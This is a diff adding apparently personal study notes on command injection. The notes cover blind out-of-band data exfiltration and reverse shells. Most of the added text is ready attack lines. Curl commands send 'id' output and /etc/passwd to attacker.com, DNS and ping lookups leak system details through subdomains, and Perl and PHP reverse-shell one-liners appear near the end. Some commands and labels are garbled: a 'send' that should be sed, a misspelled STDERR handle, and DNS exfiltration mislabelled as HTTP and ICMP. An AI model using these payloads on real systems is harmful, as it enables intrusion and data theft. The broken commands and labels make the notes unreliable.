@@ -46,3 +46,55 @@ the attacker can then use this channel to receive data from exploited  system, s
 > {wget,http://attacker.com/OOB}
 > ```
 
+In the normal mode, the data can be grabbed easily. However, in the blind mode,OOB techneque should be used
+- HTTP data Exfiltration
+- DNS data Exfiltration
+
+in order for HTTP Exfiltration, any program can be used, such curl, wget, etc...
+Data should be sent out to attacker server 
+
+> [!example] 
+> ```bash
+> curl http://attacker.com -d "$(id)"
+> ```
+> ```bash
+> curl http://attacker.com --data-binary @/etc/passwd
+> ```
+
+In order for HTTP exfiltration any program that can send ICMP packet is useful, such as ping, host and etc...
+Data should be sent out to the attacker server
+
+>[!example]
+>```bash
+>dig a +short $(whoami).attacker.com #
+>```
+>```bash
+>uname -a | od -A n -t x1 | send 's/ *//g' | while read exfil; do ping -c 1 $exfil.attacker.com; done
+>```
+>```bash
+>echo "hexinput" | xxd -r -p
+>```
+
+# Reverse Shell
+
+HTTP Is an stateless protocol, in the Command Injection, attackers execute command on a non-interactive shell
+
+An interactive shell can be achieved through 2 ways
+- spawning a shell and bind it on a port in target machine, connecting to it directly (nowadays is impossible, why?)
+- Using a reverse shell forcing target machine to connect back to attacking machine
+
+Procedure
+- Attacker's Machine listens on a port
+- Victim's machine connects to the port
+- Victim's spawn a shell
+- Attacker will have the shell
+
+> [!Example]
+> ```perl
+> perl -e 'use Socket;$i="IP;$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDER,">&S");exec("/bin/bash -i");};'
+> ```
+> ```php
+> php -r '$sock=fsockopen("IP",PORT);exec("sh <&3 >&3 2>&3");'
+> ```
+
+resource : [RevShell](https://www.revshells.com)
